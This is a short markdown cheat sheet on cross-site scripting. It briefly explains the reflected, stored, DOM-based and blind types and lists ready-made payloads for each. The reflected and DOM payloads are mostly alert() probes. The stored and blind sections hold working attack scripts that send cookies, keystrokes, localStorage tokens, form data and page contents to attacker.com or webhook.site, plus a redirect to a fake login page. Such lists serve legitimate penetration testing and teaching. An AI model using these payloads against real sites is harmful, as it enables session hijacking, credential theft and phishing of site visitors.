# XSS
Cross-Site Scripting (XSS) is a web security vulnerability that occurs when an application accepts untrusted user input and renders it into a web page without proper validation, sanitization, or encoding, allowing an attacker to inject and execute malicious client-side scripts (typically JavaScript) in the context of another user's browser session.

## Types of XSS 
XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. Here are the three main types with 5 payloads each:

#### 1.Reflected XSS(Non-Persistent)
Occurs when malicious input is immediately returned by the server in the response without proper sanitization. Requires the victim to click a malicious link.

##### Payload
<!-- Basic script injection -->
<script>alert('XSS')</script>

<!-- Image tag with onerror event -->
<img src=x onerror=alert('XSS')>

<!-- JavaScript protocol in anchor -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Body tag with onload -->
<body onload=alert('XSS')>

<!-- Input tag with onfocus autofocus -->
<input autofocus onfocus=alert('XSS')>


#### 2.Stored XSS (Persistent)
Malicious script is permanently stored on the server (database, comments, user profiles) and executed when users view the infected page.

##### Payload
<!-- Stored cookie stealer -->
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

<!-- Keylogger payload -->
<script>document.onkeypress=function(e){fetch('https://attacker.com/log?k='+e.key)}</script>

<!-- Session hijacking via stored comment -->
<img src="x" onerror="document.location='https://attacker.com/phish?session='+localStorage.getItem('token')">

<!-- Stored redirect -->
<script>window.location='https://attacker.com/fake-login'</script>

<!-- Form data exfiltration -->
<script>document.forms[0].onsubmit=function(){fetch('https://attacker.com/capture',{method:'POST',body:new FormData(this)});return false}</script>

#### 3.DOM-Based XSS
Vulnerability exists in client-side JavaScript that unsafely writes user input to the DOM. The attack never reaches the server.

##### Payload
<!-- Fragment-based (location.hash) -->
#<img src=x onerror=alert('DOM XSS')>

<!-- sink: innerHTML with img tag -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- sink: document.write -->
'+alert('XSS')+'

<!-- sink: eval() via location -->
javascript:alert('DOM XSS')

<!-- AngularJS template injection (older versions) -->
{{constructor.constructor('alert(\"XSS\")')()}}

#### 4.Blind XSS (Bonus Category)
Similar to stored XSS but the attacker doesn't see immediate feedback—payload executes in a different context (admin panels, logging systems).

##### Payload
<!-- Blind callback to attacker's server -->
<script>var i=new Image;i.src='https://attacker.com/blind?url='+location.href+'&cookie='+document.cookie;</script>

<!-- DNS exfiltration (no HTTP request) -->
<script>fetch('https://'+document.cookie+'.attacker.com')</script>

<!-- Webhook ping -->
<script>fetch('https://webhook.site/unique-id',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href})})</script>

<!-- Blind with localStorage dump -->
<script>fetch('https://attacker.com/loot',{method:'POST',body:JSON.stringify(localStorage)})</script>

<!-- XMLHttpRequest blind exfil -->
<script>var x=new XMLHttpRequest;x.open('GET','https://attacker.com/xss?d='+btoa(document.body.innerHTML));x.send();</script>

